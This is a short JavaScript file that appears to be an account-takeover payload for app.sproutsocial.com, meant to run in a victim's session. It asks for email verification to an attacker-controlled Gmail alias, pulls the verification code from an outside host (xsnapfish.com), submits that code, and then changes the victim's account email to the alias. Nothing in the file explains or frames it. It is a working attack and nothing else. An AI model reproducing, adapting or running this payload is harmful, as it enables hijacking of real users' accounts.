let rand2 = Math.floor((Math.random() * 1000) + 1);
var xhr1 = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();
var xhr3 = new XMLHttpRequest();
var URL1 = 'https://app.sproutsocial.com/identity/api/users/me/emailverification/initiate/'
var url3 = 'https://app.sproutsocial.com/api/me/email/update/'


xhr1.open( "POST", URL1, false ); // false for synchronous request
xhr1.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr1.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr1.send(JSON.stringify({"email":`refotest114+${rand2}@gmail.com`}))
var URL2 = 'https://app.sproutsocial.com/identity/api/users/emailverification/verify/';

async function getCode(){
    function sleep (time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }
    
    function httpRequest(address, reqType, asyncProc) {
        var req = new XMLHttpRequest();
        if (asyncProc) { 
          req.onreadystatechange = function() { 
            if (this.readyState == 4) {
              asyncProc(this);
            } 
          };
        }
        req.open(reqType, address, !(!asyncProc));
        req.send();
        return req;
      }
      sleep(3000).then(() => {
          httpRequest('https://www.xsnapfish.com/','GET',(e)=>{xhr2.open('POST', URL2, true);xhr2.setRequestHeader('Content-type', 'application/json');xhr2.setRequestHeader('X-Requested-With', 'XMLHttpRequest');xhr2.send(JSON.stringify({"code":`${e.responseText}`,"email":`refotest114+${rand2}@gmail.com`}))}); 
          params = `email=refotest114%252b${rand2}%2540gmail.com`
          sleep(2000).then(() => {xhr3.open('POST', url3, true);
          xhr3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
          xhr3.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
          xhr3.send(params)});
        });

}
getCode();







